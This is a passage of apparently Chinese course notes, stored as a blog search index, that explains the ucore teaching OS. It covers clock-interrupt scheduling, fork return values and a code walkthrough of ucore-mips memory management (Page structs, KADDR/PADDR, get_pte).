\u5bf9\u4e8e\u65f6\u949f\u4e2d\u65ad\u7684\u5904\u7406\u662f\u5c06\u5f53\u524d\u7684\u8fdb\u7a0b\u8bbe\u7f6e\u4e3a need_resched\uff0c\u4ece\u800c\u5728 trap() \u4e2d\u4f1a\u8c03\u7528 schedule()\u3002</p> <p>\u4e2d\u65ad\u65f6\uff0c\u8fdb\u7a0b\u7684\u201c\u7528\u6237\u6001\u4e0a\u4e0b\u6587\u201d\u88ab\u5b58\u5165\u4e2d\u65ad\u5e27\u4e2d\uff08\u8be5\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u6808\u9876\uff1b\u5176\u4e2d\u4e00\u90e8\u5206\u7531\u786c\u4ef6\u5b8c\u6210\u5982 cs, eip, eflag\uff0c\u5176\u5b83\u5982\u901a\u7528\u5bc4\u5b58\u5668\u5219\u7531\u8f6f\u4ef6\u5b8c\u6210\uff09\u3002\u800c\u4e4b\u540e\u5728\u5185\u6838\u6001\u8fdb\u884c\u7684\u4e00\u7cfb\u5217\u51fd\u6570\u8c03\u7528\u4e5f\u662f\u4f7f\u7528\u8be5\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u3002\u5728\u6267\u884c schedule \u540e\uff0c\u901a\u8fc7\u8f6f\u4ef6\u5c06\u8be5\u8fdb\u7a0b\u7684\u201c\u5185\u6838\u6001\u4e0a\u4e0b\u6587\u201d\u5b58\u5165\u8be5\u8fdb\u7a0b\u6570\u636e\u7ed3\u6784\u7684 context \u53d8\u91cf\u4e2d\uff08eip \u4e3a switch_to() \u8c03\u7528\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\uff09\u3002\u56e0\u6b64\u518d\u6b21\u5207\u6362\u56de\u6765\u65f6\uff0c\u4ecd\u5904\u4e8e\u5185\u6838\u6001\uff0c\u5e76\u4ece switch_to() \u4e0b\u4e00\u6761\u7ee7\u7eed\u6267\u884c\uff0c\u7ecf\u8fc7\u4e00\u7cfb\u5217\u51fd\u6570\u8fd4\u56de\uff0c\u6700\u7ec8\u56de\u5230 trap_ret\uff0c\u4ece\u8fdb\u7a0b\u7684\u4e2d\u65ad\u5e27\u8fd4\u56de\u5230\u7528\u6237\u6001\uff0c\u4e5f\u5c31\u662f\u8be5\u8fdb\u7a0b\u65f6\u949f\u4e2d\u65ad\u4e4b\u524d\u7684\u72b6\u6001\u3002</p> </li> <li> <p>\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5b8c\u6574\u751f\u547d\u5468\u671f\uff1f</p> <pre><code>// process's state in his life cycle\nenum proc_state {\n    PROC_UNINIT = 0,  // uninitialized\n    PROC_SLEEPING,    // sleeping\n    PROC_RUNNABLE,    // runnable(maybe running)\n    PROC_ZOMBIE,      // almost dead, and wait parent proc to reclaim his resource\n};\n</code></pre> <p></p> </li> <li> <p>fork \u8c03\u7528\uff0c\u4e3a\u4ec0\u4e48\u7236\u8fdb\u7a0b\u8fd4\u56de\u503c\u4e3a pid\uff0c\u5b50\u8fdb\u7a0b\u8fd4\u56de\u503c\u4e3a 0\uff08\u6d89\u53ca\u5230\u7528\u6237\u8fdb\u7a0b\u7684\u521b\u5efa\uff09</p> <pre><code>cprintf(\"I am the parent. Forking the child...\\n\");\nif ((pid = fork()) == 0) {\n cprintf(\"I am the child.\\n\");\n}\n</code></pre> <p>\u7b54\uff1a</p> <p>\u7236\u8fdb\u7a0b\u6267\u884c\u8def\u7ebf\uff1a</p> <ol> <li> <p>fork() -&gt; /user/libs/syscall::sys_fork()</p> <p>int SYS_fork \u5f15\u8d77\u4e2d\u65ad\uff0c\u4fdd\u5b58\u4e2d\u65ad\u5e27\uff08\u7236\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u4e2d\uff09</p> </li> <li> <p>__all_traps -&gt; trap -&gt; trap_dispatch -&gt; syscall -&gt; do_fork</p> <p>\u200b do fork\u53c2\u6570\u4e3a\u7236\u8fdb\u7a0b\u7684\u4e2d\u65ad\u5e27</p> </li> <li> <p>\u4ece do_fork \u8fd4\u56de\u5230 syscall</p> <p>syscall \u4e2d\u4ee3\u7801\uff1a</p> <pre><code>tf-&gt;tf_regs.reg_eax = syscalls[num](arg);\n</code></pre> <p>\u5c06\u7236\u8fdb\u7a0b\u7684\u4e2d\u65ad\u5e27\u7684 eax \u4fee\u6539\u4e3a do_fork \u8fd4\u56de\u7684 pid</p> </li> <li> <p>\u8fd4\u56de\u5230__all_traps -&gt; trapret</p> <p>\u4ece\u4e2d\u65ad\u5e27\u8fd4\u56de\uff0c\u7ee7\u7eed\u6267\u884cfork()\u540e\u4ee3\u7801</p> </li> </ol> <p>\u5b50\u8fdb\u7a0b\u6267\u884c\u8def\u7ebf\uff1a</p> <ol> <li>schedule -&gt; proc_run - &gt; switch_to -&gt; fork_ret<p>\u4ece\u4e2d\u65ad\u5e27\u8fd4\u56de\uff0c\u6267\u884c fork() \u540e\u7684\u4ee3\u7801</p> </li> </ol> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u7236\u8fdb\u7a0b\u66f4\u6539\u4e86 eax\uff0c\u6545\u8fd4\u56de\u503c\u53d8\u4e3a pid\uff0c\u5b50\u8fdb\u7a0b\u5219\u4e3a\u539f\u59cb\u7684 eax\uff08\u8fd9\u91cc\u6211\u8fd8\u4e0d\u592a\u6e05\u695a\u4e3a\u4ec0\u4e48\u4e00\u5b9a\u4e3a 0\uff09</p> </li> </ol>","tags":["ucore"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/","title":"ucore-mips \u4ee3\u7801\u5206\u6790","text":"<ul> <li>1. Makefile</li> <li>2. kernel_entry</li> <li>3. kern_init<ul> <li>\u6742\u9879<ul> <li>tlb_invalidate_all</li> <li>pic_init</li> <li>cons_init &amp; clock_init</li> <li>check_initrd</li> </ul> </li> <li>kprintf</li> <li>pmm_init<ul> <li>page \u7ed3\u6784\u4f53<ul> <li>\u8fd9\u91cc\u5e94\u8be5\u6709\u4e00\u4e2a\u9519\u8bef</li> </ul> </li> <li>\u7a7a\u95f2\u9875</li> <li>pmm_manager</li> <li>\u9875\u8868\u76f8\u5173\u51fd\u6570<ul> <li>get_pte</li> <li>page_insert</li> <li>page_remove</li> <li>pgdir_alloc_page</li> </ul> </li> <li>check<ul> <li>check_pgdir</li> <li>check_boot_pgdir\uff08tlb refill \u5904\u7406)</li> </ul> </li> <li>kmalloc</li> </ul> </li> <li>vmm_init<ul> <li>vma_struct</li> <li>mm_struct<ul> <li>\u5173\u952e\u51fd\u6570</li> </ul> </li> <li>check_pgfault\uff08pagefault \u7684\u5904\u7406\uff09</li> </ul> </li> <li>\u51fd\u6570\u8c03\u7528</li> <li>sched_init &amp; proc_init<ul> <li>proc_struct(\u8fdb\u7a0b\u63a7\u5236\u5757)<ul> <li>tf</li> <li>kstack</li> <li>mm</li> </ul> </li> <li>\u521b\u5efa\u5185\u6838\u7ebf\u7a0b<ul> <li>idle</li> <li>init(kernel_thread &amp; do_fork)</li> <li>user_main</li> </ul> </li> <li>\u8c03\u5ea6<ul> <li>init \u8fdb\u7a0b\u6267\u884c\u8fc7\u7a0b</li> <li>user_main \u7684\u6267\u884c\u8fc7\u7a0b</li> </ul> </li> </ul> </li> <li>ide_init &amp; fs_init</li> </ul> </li> </ul>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#1-makefile","title":"1. Makefile","text":"<ol> <li><code>boot/loader.bin</code>\u57fa\u672c\u5c31\u662f\u4e00\u4e2a\u8bfb\u53d6 elf \u7684\u51fd\u6570\uff0c\u6211\u4eec\u4e0a\u677f\u4f7f\u7528 pmon \u52a0\u8f7d ucore\uff0c\u56e0\u6b64\u7528\u4e0d\u5230\u3002</li> <li><code>obj/ucore-kernel-initrd</code>\u662f\u4e00\u4e2a elf \u6587\u4ef6\uff0c\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\uff0c\u5b83\u7684 data \u6bb5\u5305\u542b<code>user/_archive</code>\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff08\u5305\u542b\u4e00\u4e2a test.txt\uff09\u548c<code>$(USER_APP_BINS)</code>\uff08\u5982 sh, ls \u7b49\u7528\u6237\u7a0b\u5e8f\uff09\u7684\u5185\u5bb9\u3002\u5c06\u5185\u6838\u548c\u6587\u4ef6\u7cfb\u7edf\u6253\u5305\u5230\u4e86\u4e00\u8d77\u3002</li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#2-kernel_entry","title":"2. kernel_entry","text":"<p>kern/init/entry.S</p> <ol> <li> <p>\u8bbe\u7f6e\u4e86$gp</p> <p>\u5b9a\u4e49\u5728\u94fe\u63a5\u811a\u672c\u91cc\uff0c\u53ef\u4ee5\u901a\u8fc7<code>readelf obj/ucore-kernel-initrd -a|grep _gp</code>\u6765\u67e5\u770b\u5176\u503c\u3002\u53c2\u8003\u503c\uff08\u4fee\u6539\u4e86\u4ee3\u7801\u7f16\u8bd1\u51fa\u7684\u503c\u53ef\u80fd\u4e0d\u4e00\u6837\uff09<code>0x800c7f40</code></p> </li> <li> <p>\u8bbe\u7f6e\u4e86$sp\uff0c\u542f\u52a8\u65f6\u7528\u7684\u6808\uff0c\u6808\u5927\u5c0f\u4e3a<code>KSTACKSIZE</code>\uff0c8KB</p> <p>\u53c2\u8003\u503c\uff1a<code>bootstacktop(0x80068730)</code>\uff0c<code>bootstack(0x80066730)</code></p> </li> <li> <p>\u8bbe\u7f6e\u4e86 Ebase \u4e3a<code>__exception_vector</code>\u3002\u53c2\u8003\u503c\uff1a<code>0x8002b000</code>\u3002__exception_vector \u5305\u542b\u4e86\u5404\u5f02\u5e38\u5411\u91cf\u5730\u5740\u7684\u5165\u53e3\u3002</p> </li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#3-kern_init","title":"3. kern_init","text":"<p>kern/int/init.c</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u6742\u9879","title":"\u6742\u9879","text":"","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#tlb_invalidate_all","title":"tlb_invalidate_all","text":"<p>\u5b9a\u4e49\u4e8e kern/include/thumips_tlb.h \u548c kern/mm/thumips_tlb.c</p> <p>tlb_invalidata_all \u5faa\u73af\u8c03\u7528 write_one_tlb \u6e05\u7a7a tlb \u8868\u9879 \u9ed8\u8ba4 tlb \u6709 128 \u9879\uff0c\u867d\u7136\u4e0d\u4f1a\u5bfc\u81f4\u9519\u8bef\uff0c\u4f46\u662f\u53ef\u4ee5\u4f18\u5316</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#pic_init","title":"pic_init","text":"<p>\u5b9a\u4e49\u4e8e kern/driver/picirq.c pic_init -&gt; write_c0_status \u5c06 Statu \u4e2d\u7684 IM \u57df\u5168\u7f6e 0\uff0c\u5173\u95ed\u6240\u6709\u4e2d\u65ad\u3002 \u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7 pic_enable(int irq) \u6216 pic_disable(int irq) \u5f00\u5173\u4e2d\u65ad</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#cons_init--clock_init","title":"cons_init &amp; clock_init","text":"<p>\u4e00\u4e2a\u521d\u59cb\u5316\u4e32\u53e3\uff0c\u4e00\u4e2a\u521d\u59cb\u5316\u65f6\u949f\u4e2d\u65ad\u3002</p> <p>\u76f8\u5173\u5b8f\u5b9a\u4e49\u4e8e/kern/include/thumips.h</p> <pre><code>#define COM1_IRQ        3\n#define TIMER0_IRQ       7\n</code></pre> <p>clock \u9700\u8981\u7528\u5230<code>cp0_count</code>\u548c<code>cp0_compare</code> \u8bbe\u7f6e clock \u4e2d\u65ad\u540e\uff0c\u6bcf<code>clock.c::TIMER0_INTERVAL</code>=1000000 \u540e\u4f1a\u4ea7\u751f\u4e00\u4e2a\u65f6\u949f\u4e2d\u65ad</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#check_initrd","title":"check_initrd","text":"<p>\u68c0\u67e5\u5185\u6838\u662f\u5426\u6709 initrd\uff0c\u901a\u8fc7\u5224\u65ad\u662f\u5426_initrd_begin == _initrd_end)</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#kprintf","title":"kprintf","text":"<p>\u5185\u6838\u7b2c\u4e00\u6b21\u8f93\u51fa\u4fe1\u606f</p> <pre><code>const char *message = \"(THU.CST) os is loading ...\\n\\n\";\nkprintf(message);\n</code></pre> <p>kprintf \u51fd\u6570\u6700\u540e\u8c03\u7528\u4e32\u53e3\u7684 cons_putc \u8f93\u51fa\u5b57\u7b26\u3002\u4e32\u53e3\u8f93\u51fa\u5b57\u7b26\u91c7\u7528\u5fd9\u7b49\u5f85\u65b9\u5f0f\u3002</p> <pre><code>kern/lib/stdio.c::kprintf -&gt; kern/lib/stdio.c::vkprintf -&gt; kern/lib/printfmt.c::vprintfmt(cputch, ...)\n\nkern/lib/stdio.c::cputch -&gt; kern/driver/console.c::cons_putc\n</code></pre> <pre><code>#!kern/driver/console.c\n\nstatic void\nserial_putc_sub(int c) {\n    while (!(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY)) {\n    }\n    outb(COM1 + COM_TX, c);\n}\n</code></pre> <p>\u4f5c\u4e3a\u5bf9\u6bd4\uff0c\u7528\u6237\u7a0b\u5e8f cprintf</p> <pre><code>user/lib/stdio.c::cprintf -&gt; user/lib/stdio.c::vcprintf -&gt; user/lib/stdio.c::vprintfmt(cputch, ...)\nuser/lib/stdio.c::cputch -&gt; user/lib/syscall.c::sys_putc -&gt; syscall(SYS_putc, )\n\u7cfb\u7edf\u8c03\u7528\uff0c\u8fdb\u5165\u5185\u6838\n\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u8c03\u7528kern/syscall/syscall.c::sys_putc -&gt; kern/lib/stdio.c::kputchar -&gt; cons_putc\n</code></pre> <p>\u7528\u6237\u7a0b\u5e8f\u8f93\u51fa\u6bcf\u4e00\u4e2a\u5b57\u7b26\u90fd\u4f1a\u89e6\u53d1\u4e00\u6b21\u7cfb\u7edf\u8c03\u7528</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#pmm_init","title":"pmm_init","text":"","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#page-\u7ed3\u6784\u4f53","title":"page \u7ed3\u6784\u4f53","text":"<pre><code>struct Page {\n    atomic_t ref;                   // page frame's reference counter\n    uint32_t flags;                 // array of flags that describe the status of the page frame\n    unsigned int property;          // used in buddy system, stores the order (the X in 2^X) of the continuous memory block\n    int zone_num;                   // used in buddy system, the No. of zone which the page belongs to\n    list_entry_t page_link;         // free list link\n//    swap_entry_t index;             // stores a swapped-out page identifier\n    list_entry_t swap_link;         // swap hash link\n};\n</code></pre> <p>ucore \u5c06\u7269\u7406\u5185\u5b58\u5212\u5206\u6210\u4e00\u4e2a\u4e00\u4e2a\u7684\u9875\uff0c\u5e76\u4f7f\u7528 Page \u7ed3\u6784\u4f53\u6570\u7ec4\u6765\u7ba1\u7406\u3002\u4e00\u4e2a Page \u9879\u5bf9\u5e94\u4e00\u4e2a\u7269\u7406\u9875\u3002</p> <p>\u53c2\u8003 pmm.c::page_init \u4ee3\u7801</p> <pre><code>kprintf(\"memory map:\\n\");\nkprintf(\"    [\");\nprinthex(KERNBASE);\nkprintf(\", \");\nprinthex(KERNTOP);\nkprintf(\"]\\n\\n\");\n\nmaxpa = KERNTOP;\nnpage = KMEMSIZE &gt;&gt; PGSHIFT;\n\n// end address of kernel\nextern char end[];\n// put page structure table at the end of kernel\npages = (struct Page *)ROUNDUP_2N((void *)end, PGSHIFT); \n</code></pre> <p><code>KMEMSIZE</code>\u4ee3\u8868\u5185\u6838\u7ba1\u7406\u7684\u7269\u7406\u5185\u5b58\u7684\u5927\u5c0f\uff0cnpage \u8ba1\u7b97\u51fa\u6765\u4e3a\u7269\u7406\u9875\u7684\u4e2a\u6570\u3002</p> <p>end \u5728\u94fe\u63a5\u811a\u672c\u4e2d\u5b9a\u4e49\uff0c\u4e3a ucore-kernel-initrd \u7684\u7ed3\u5c3e\u3002\u5373 ucore \u5728\u5185\u6838\u7684\u7ed3\u5c3e\u5206\u914d\u4e86\uff08\u76f4\u63a5\u5199\uff09Page \u6570\u7ec4\u7684\u7a7a\u95f4\uff0cpages \u4e3a\u6570\u7ec4\u7684\u8d77\u59cb\u5730\u5740\u3002</p> <p>\u6b64\u65f6 page \u9879\u53ef\u4ee5\u548c\u7269\u7406\u9875\u4e00\u4e00\u5bf9\u5e94\u8d77\u6765\u4e86</p> <pre><code>static inline ppn_t\npage2ppn(struct Page *page) {\n    return page - pages;\n}\n\nstatic inline uintptr_t\npage2pa(struct Page *page) {\n    return KERNBASE + (page2ppn(page) &lt;&lt; PGSHIFT);\n}\n\nstatic inline struct Page *\npa2page(uintptr_t pa) {\n    if (PPN(pa) &gt;= npage) {\n        panic(\"pa2page called with invalid pa\");\n    }\n    return &amp;pages[PPN(pa)];\n}\n\nstatic inline void *\npage2kva(struct Page *page) {\n    return KADDR(page2pa(page));\n}\n</code></pre> <p>\u8fd9\u91cc\u5f3a\u8c03\u4e00\u4e0b<code>page2kva</code>\u4e2d<code>KADDR</code>\u7684\u4f5c\u7528\uff0c\u4e8b\u5b9e\u4e0a\u5982\u679c\u770b\u5176\u5b9a\u4e49\u7684\u8bdd\uff0cKADDR(pa) \u7684\u503c\u548c pa \u662f\u4e00\u6837\u7684\uff0c\u5982\u4e0b</p> <pre><code>/* *\n * PADDR - takes a kernel virtual address (an address that points above KERNBASE),\n * where the machine's maximum 256MB of physical memory is mapped and returns the\n * corresponding physical address.  It panics if you pass it a non-kernel virtual address.\n * */\n#define PADDR(kva) ({                                                   \\\n            uintptr_t __m_kva = (uintptr_t)(kva);                       \\\n            if (__m_kva &lt; KERNBASE) {                                   \\\n                panic(\"PADDR called with invalid kva %08lx\", __m_kva);  \\\n            }                                                           \\\n            __m_kva ;                                         \\\n        })\n\n/* *\n * KADDR - takes a physical address and returns the corresponding kernel virtual\n * address. It panics if you pass an invalid physical address.\n * */\n#define KADDR(pa) ({                                                    \\\n            uintptr_t __m_pa = (pa);                                    \\\n            size_t __m_ppn = PPN(__m_pa);                               \\\n            if (__m_ppn &gt;= npage) {                                     \\\n                panic(\"KADDR called with invalid pa %08lx\", __m_pa);    \\\n            }                                                           \\\n            (void *) (__m_pa);                               \\\n        })\n</code></pre> <p>\u800c\u4e4b\u6240\u4ee5\u9700\u8981\u8fdb\u884c\u4e00\u6b21\u8f6c\u6362\uff0c\u4e3b\u8981\u662f\u4fdd\u6301\u903b\u8f91\u4e0a\u7684\u4e00\u81f4\u6027\u3002\u56e0\u4e3a CPU \u76f4\u63a5\u53d1\u51fa\u7684\u5730\u5740\u90fd\u662f\u865a\u62df\u5730\u5740\uff0c\u4f1a\u7ecf\u8fc7 MMU \u8fdb\u884c\u865a\u62df\u5730\u5740\u8f6c\u6362\uff08\u4e00\u822c\u57fa\u4e8e TLB\uff0c\u800c TLB \u57fa\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u7684\u9875\u8868\uff09\u3002\u6574\u4e2a\u8f6c\u6362\u8fc7\u7a0b\u662f\u786c\u4ef6\u81ea\u52a8\u5b8c\u6210\u7684\uff0c\u56e0\u6b64\u8f6f\u4ef6\u57fa\u672c\u4e0d\u7528\u548c\u7269\u7406\u5730\u5740\u6253\u4ea4\u9053\uff08\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u6d89\u53ca\u5230\u548c\u786c\u4ef6\u8f6f\u786c\u4ef6\u534f\u540c\u7684\u90e8\u5206\u4f1a\u6d89\u53ca\u5230\u7269\u7406\u5730\u5740\uff0c\u5982\u9875\u8868\u4e2d\u5b58\u50a8\u7684\u5730\u5740\u662f\u7269\u7406\u5730\u5740\uff0c\u5f53 MIPS \u4e2d tlb refill \u5f02\u5e38\u65f6\uff0c\u4fbf\u4f1a\u8bfb\u53d6\u9875\u8868\u9879\u52a0\u8f7d\u5230 TLB \u8868\u9879\u4e2d\uff09</p> <p>\u56e0\u800c\u6211\u4eec\u5728\u4ee3\u7801\u4e2d\u8bbf\u95ee\u6570\u636e\u65f6\u90fd\u8981\u4f7f\u7528\u865a\u62df\u5730\u5740\u3002</p> <p>\u56e0\u4e3a\u8fd9\u91cc\u7684\u6574\u4e2a\u5185\u6838\u865a\u62df\u7a7a\u95f4\uff08<code>[KERNBASE, KERNBASE+KMEMSIZE]=[0x8000_0000, 0x8200_0000)</code>\uff09\u90fd\u4f4d\u4e8e MIPS \u4e2d\u7684 kseg0 \u6bb5\uff0c\u800c\u8be5\u6bb5\u91c7\u7528\u56fa\u5b9a\u5730\u5740\u6620\u5c04\u7684\u65b9\u5f0f\uff0c\u800c\u4e0d\u4f7f\u7528 TLB\uff0c\u56e0\u6b64\u5185\u6838\u8bbf\u95ee\u6574\u4e2a\u5185\u6838\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e1d\u6beb\u4e0d\u7528\u62c5\u5fc3\u3002</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u8fd9\u91cc\u5e94\u8be5\u6709\u4e00\u4e2a\u9519\u8bef","title":"\u8fd9\u91cc\u5e94\u8be5\u6709\u4e00\u4e2a\u9519\u8bef","text":"<p>\u6309\u7167\u5b9a\u4e49\u6765\u8bf4\uff0cpage2pa \u5c31\u5e94\u8be5\u662f (page2ppn(page) &lt;&lt; PGSHIFT)\uff0c\u52a0\u4e86 KERNBASE \u540e\u53cd\u800c\u662f\u865a\u62df\u5730\u5740\u4e86\u3002</p> <p>\u4e0d\u8fc7\u56e0\u4e3a KADDR \u4e5f\u9519\u4e86\uff0c\u56e0\u6b64\u5f53\u6211\u4eec\u5206\u914d\u4e86\u4e00\u4e2a\u7a7a\u95f2\u7269\u7406\u9875 page \u540e\uff0c\u8981\u83b7\u5f97\u5176\u865a\u62df\u5730\u5740</p> <p><code>KADDR(page2pa(page))</code>\u53cd\u800c\u6ca1\u9519\u4e86</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u7a7a\u95f2\u9875","title":"\u7a7a\u95f2\u9875","text":"<p>\u7a7a\u95f2\u5730\u5740\u5f00\u59cb\u4e8e Page \u6570\u7ec4\u4e4b\u540e\u3002init_memmap \u4f1a\u8c03\u7528 pmm_manager \u7684 init_memmap \u51fd\u6570\uff0c\u7528\u4e8e\u8bb0\u5f55\u54ea\u4e9b\u9875\u662f\u7a7a\u95f2\u7684\u3002</p> <pre><code>uintptr_t freemem = PADDR((uintptr_t)pages + sizeof(struct Page) * npage);\nPRINT_HEX(\"freemem start at: \", freemem);\n\nuint32_t mbegin = ROUNDUP_2N(freemem, PGSHIFT);\nuint32_t mend = ROUNDDOWN_2N(KERNTOP, PGSHIFT);\nassert( mbegin &lt; mend );\ninit_memmap(pa2page(mbegin), (mend - mbegin) &gt;&gt; PGSHIFT );\nPRINT_HEX(\"free pages: \", (mend-mbegin)&gt;&gt;PGSHIFT);\nPRINT_HEX(\"## \", sizeof(struct Page));\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#pmm_manager","title":"pmm_manager","text":"<p>\u7269\u7406\u5185\u5b58\u7ba1\u7406\u5176\u5b9e\u5c31\u662f\u8981\u5b9e\u73b0\u7269\u7406\u7a7a\u95f2\u9875\u7684\u5206\u914d\u548c\u56de\u6536\uff0cucore \u5b9a\u4e49\u4e86 pmm_manager \u7684\u7ed3\u6784\u4f53\uff0c\u53ef\u4ee5\u8ba4\u4e3a C \u4e2d\u5b9e\u73b0\u7684\u7c7b\u3002</p> <p>\u5173\u952e\u7684\u4e24\u4e2a\u51fd\u6570\uff1a</p> <pre><code>struct Page *(*alloc_pages)(size_t n);\nvoid (*free_pages)(struct Page *base, size_t n);\n</code></pre> <p>alloc_pages \u4ece\u7a7a\u95f2\u9875\u4e2d\u5206\u914d\u4e86\u4e00\u6bb5\u8fde\u7eed\u7684\u7a7a\u95f2\u9875</p> <p>\u800c free_pages \u5219\u5c06\u6307\u5b9a\u7684\u4e00\u6bb5\u8fde\u7eed\u7684\u9875\u91cd\u65b0\u56de\u6536\u4e3a\u7a7a\u95f2\u9875</p> <p>ucore \u4ee3\u7801\u5b9e\u73b0\u4e86\u4f19\u4f34\u5206\u914d\u7cfb\u7edf (buddy system)\uff0c\u53ef\u4ee5\u53c2\u8003\u5176\u5177\u4f53\u5b9e\u73b0</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u9875\u8868\u76f8\u5173\u51fd\u6570","title":"\u9875\u8868\u76f8\u5173\u51fd\u6570","text":"<p>ucore \u5b9e\u73b0\u4e86\u4e8c\u7ea7\u9875\u8868</p> <p>\u5173\u952e\u51fd\u6570</p> <pre><code>pte_t *get_pte(pde_t *pgdir, uintptr_t la, bool create);\nstruct Page *get_page(pde_t *pgdir, uintptr_t la, pte_t **ptep_store); //\u6839\u636e pte \u7684\u503c\u83b7\u5f97\u5bf9\u5e94\u7684 page\nvoid page_remove(pde_t *pgdir, uintptr_t la);\nint page_insert(pde_t *pgdir, struct Page *page, uintptr_t la, uint32_t perm);\nstruct Page * pgdir_alloc_page(pde_t *pgdir, uintptr_t la, uint32_t perm);\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#get_pte","title":"get_pte","text":"<pre><code>pte_t *get_pte(pde_t * pgdir, uintptr_t la, bool create)\n</code></pre> <p>\u51fd\u6570\u4f5c\u7528\uff1a\u7ed9\u5b9a\u9875\u76ee\u5f55\u8868\u7684\u865a\u62df\u5730\u5740\uff0c\u67e5\u627e\u865a\u62df\u5730\u5740 la \u5bf9\u5e94\u7684\u9875\u8868\u9879 pte\u3002\uff08\u53ea\u8981 la \u5728\u4e00\u4e2a\u9875\u5185\uff0c\u8fd4\u56de\u7684 pte \u662f\u76f8\u540c\u7684\uff09  \u6ce8\uff1a\u83b7\u5f97\u7684\u662f pte \u9879\u7684\u865a\u62df\u5730\u5740 \u8fc7\u7a0b\uff1a</p> <ol> <li> <p>\u5148\u8ba1\u7b97\u9875\u76ee\u5f55\u8868\u4e2d\u5bf9\u5e94 pde \u8868\u9879\u7684\u865a\u62df\u5730\u5740</p> <pre><code>pdep = pgdir + PDX(la)\n</code></pre> </li> <li> <p>\u5982\u679c pde \u9879\u6709\u6548\uff0c\u5373<code>((*pdep)&amp;PTE_P) == 0</code>\u3002\u76f4\u63a5\u8bbf\u95ee pde \u83b7\u5f97 la \u5bf9\u5e94\u4e8c\u7ea7\u9875\u8868\u7684\u7269\u7406\u5730\u5740\u3002</p> <pre><code>PDE_ADDR(*pdep)\n</code></pre> </li> <li> <p>\u8ba1\u7b97\u4e8c\u7ea7\u9875\u8868\u4e2d\u5bf9\u5e94\u9875\u8868\u9879 pte \u7684\u7269\u7406\u5730\u5740</p> <pre><code>(pte_t*)(    PDE_ADDR(*pdep)   ) + PTX(la)\n</code></pre> </li> <li> <p>\u8f6c\u6362\u6210\u865a\u62df\u5730\u5740</p> <pre><code>(pte_t*)KADDR(   (uintptr_t)(  (pte_t*)(PDE_ADDR(*pdep))+PTX(la)  )  )\n</code></pre> </li> <li> <p>\u5982\u679c 02 